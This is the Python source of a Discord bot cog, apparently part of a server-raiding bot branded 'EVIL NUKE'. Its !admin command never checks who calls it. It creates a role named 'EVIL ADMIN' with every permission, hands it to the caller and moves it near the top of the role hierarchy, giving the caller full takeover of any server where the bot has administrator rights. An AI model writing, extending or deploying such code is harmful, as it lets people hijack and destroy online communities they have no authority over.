import disnake
from disnake.ext import commands
from ..utils.blacklist import is_blacklisted


class Admin(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="admin")
    async def admin(self, ctx):
        """Выдать себе роль с полными правами администратора"""
        
        # Проверка чёрного списка
        if is_blacklisted(ctx.guild.id):
            embed = disnake.Embed(
                title="⛔ Доступ запрещён",
                description="Этот сервер находится в чёрном списке.",
                color=disnake.Color.red()
            )
            await ctx.send(embed=embed)
            return

        # Проверяем, есть ли у бота права на управление ролями
        if not ctx.guild.me.guild_permissions.manage_roles:
            embed = disnake.Embed(
                title="❌ Ошибка",
                description="У бота нет прав на управление ролями!\n"
                            "Выдайте боту права **Manage Roles**",
                color=disnake.Color.red()
            )
            await ctx.send(embed=embed)
            return

        # Проверяем, есть ли у бота права на создание ролей
        if not ctx.guild.me.guild_permissions.administrator:
            embed = disnake.Embed(
                title="❌ Ошибка",
                description="У бота нет прав администратора!\n"
                            "Для создания роли с админ-правами нужны права администратора.",
                color=disnake.Color.red()
            )
            await ctx.send(embed=embed)
            return

        try:
            # Создаём роль с полными правами
            role = await ctx.guild.create_role(
                name="👑 EVIL ADMIN",
                permissions=disnake.Permissions.all(),
                color=disnake.Color.from_rgb(255, 0, 0),
                reason="Создано командой !admin"
            )

            # Выдаём роль пользователю
            await ctx.author.add_roles(role, reason="Выдано командой !admin")

            # Поднимаем роль выше всех (ставим на 2-е место сверху)
            # Получаем все роли, сортируем по позиции
            roles = sorted(ctx.guild.roles, key=lambda r: r.position, reverse=True)
            # Ставим новую роль на 2-е место (сразу под @everyone)
            if len(roles) > 1:
                new_position = roles[1].position + 1
                await role.edit(position=new_position)

            embed = disnake.Embed(
                title="👑 ВЫДАЧА АДМИНКИ",
                description=f"**{ctx.author.name}**, вы успешно получили роль **EVIL ADMIN**!\n\n"
                            f"✅ Роль создана и выдана.\n"
                            f"🔴 Цвет: Красный\n"
                            f"🛡️ Права: Полный доступ",
                color=disnake.Color.from_rgb(255, 0, 0)
            )
            embed.set_footer(text="EVIL NUKE", icon_url=ctx.bot.user.display_avatar.url)
            await ctx.send(embed=embed)

        except disnake.Forbidden:
            embed = disnake.Embed(
                title="❌ Ошибка",
                description="У бота недостаточно прав!\n"
                            "Убедитесь, что бот имеет права **Administrator** или **Manage Roles**\n"
                            "и его роль выше всех остальных.",
                color=disnake.Color.red()
            )
            await ctx.send(embed=embed)

        except Exception as e:
            embed = disnake.Embed(
                title="❌ Ошибка",
                description=f"Не удалось создать роль: {e}",
                color=disnake.Color.red()
            )
            await ctx.send(embed=embed)


def setup(bot):
    bot.add_cog(Admin(bot))